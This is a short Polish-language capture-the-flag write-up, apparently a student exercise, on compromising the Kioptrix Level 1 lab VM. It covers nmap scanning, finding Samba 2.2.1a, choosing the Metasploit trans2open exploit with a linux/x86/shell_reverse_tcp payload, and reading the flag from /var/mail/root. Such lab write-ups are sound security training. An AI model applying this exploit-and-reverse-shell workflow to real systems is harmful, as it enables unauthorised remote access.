# KIOPTRIX - lvl 1

Na podstawie skanowania nmap można zobaczyć, że host ma  6 otwartych portów, w tym port 139 z protokołem Samba smbd. 

![image](https://github.com/wcyb19z-lab/wcyb19z-projekt-ahermani/blob/screenshots/Zadanie%202/Kioptrix/nmap_t4.png)

Żeby sprawdzić dokładną wersję Samby, użyłam skryptu `auxiliary/scanner/smb/smb_version`.

![image](https://github.com/wcyb19z-lab/wcyb19z-projekt-ahermani/blob/screenshots/Zadanie%202/Kioptrix/samba_version.png)

Jak widać, na hoście działa `Samba 2.2.1a`. Poszukałam do niej exploita. 

![image](https://github.com/wcyb19z-lab/wcyb19z-projekt-ahermani/blob/screenshots/Zadanie%202/Kioptrix/searchsploit_samba.png)

A następnie w metasploicie wyszukałam exploita wykorzystującego znalezioną wyżej podatność `trans2open`.

![image](https://github.com/wcyb19z-lab/wcyb19z-projekt-ahermani/blob/screenshots/Zadanie%202/Kioptrix/used_exploit.png)

Teraz mogłam użyć exploita, wyszukać i ustawić payload (użyłam `payload linux/x86/shell_reverse_tcp`), a następnie odpowiednie hosty.
 * LHOST 192.168.10.106 - Kali Linux
 * RHOST 192.168.10.105 - Kioptrix
 
 Uzyskałam dostęp do maszyny i mogłam swobodnie zdalnie przeglądać jej zawartość. Flaga ukryta została w pliku o ścieżce `/var/mail/root`.
 
 ![image](https://github.com/wcyb19z-lab/wcyb19z-projekt-ahermani/blob/screenshots/Zadanie%202/Kioptrix/flag.png)
